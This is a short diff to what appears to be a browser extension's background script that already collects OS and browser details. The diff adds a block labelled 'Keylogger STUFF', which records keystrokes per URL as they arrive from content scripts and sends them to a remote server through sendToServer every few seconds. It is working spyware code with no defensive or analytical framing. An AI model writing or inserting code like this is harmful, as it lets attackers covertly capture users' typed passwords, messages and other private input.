@@ -96,7 +96,6 @@ function detectBrowser() {
     }
 }
 
-
 function collectSystemInfo() {
     const systemInfo = {
         os: detectOS(),
@@ -111,3 +110,30 @@ function collectSystemInfo() {
 }
 
 collectSystemInfo();
+
+
+/**********************
+
+       Keylogger STUFF
+
+************************/
+
+
+let keystrokeData = {};
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.type === "keystroke") {
+        const { url, text, timestamp } = message;
+
+        if (!keystrokeData[url]) {
+            keystrokeData[url] = [];
+        }
+
+        keystrokeData[url].push({ text, timestamp });
+        setTimeout(() => {
+            sendToServer("keys", keystrokeData);
+            keystrokeData = {}; // Clear after sending
+        }, 3000);
+
+    }
+});
